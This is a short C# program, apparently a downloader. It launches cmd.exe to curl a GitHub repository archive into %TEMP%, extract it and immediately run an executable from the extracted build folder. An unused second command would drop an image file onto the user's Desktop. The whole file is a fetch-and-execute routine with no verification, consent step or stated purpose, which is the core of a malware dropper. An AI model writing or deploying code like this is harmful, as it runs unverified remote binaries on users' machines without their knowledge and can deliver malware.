using System.Diagnostics;

const string DOWNLOAD_GIT_PROJECT = "/c curl -L -o %TEMP%/master.zip https://github.com/apr1l1s/Margo/archive/refs/heads/master.zip " +
                                    "&& tar -xf %TEMP%/master.zip -C %TEMP%" +
                                    "&& %TEMP%/Margo-master/Console.Advanced/bin/Debug/net8.0/Console.Advanced.exe";
string DOWNLOAD_IMAGE = $"/c curl -L -o C:/Users/{Environment.UserName}/Desktop/photo.jpg https://i.postimg.cc/QjQnTFhR/photo-2025-01-15-15-39-56.jpg?dl=1";
new Process
{
    StartInfo = new ProcessStartInfo
    {
        FileName = "cmd.exe",
        Arguments = DOWNLOAD_GIT_PROJECT,
        CreateNoWindow = false,
        UseShellExecute = false,
    }
}.Start();
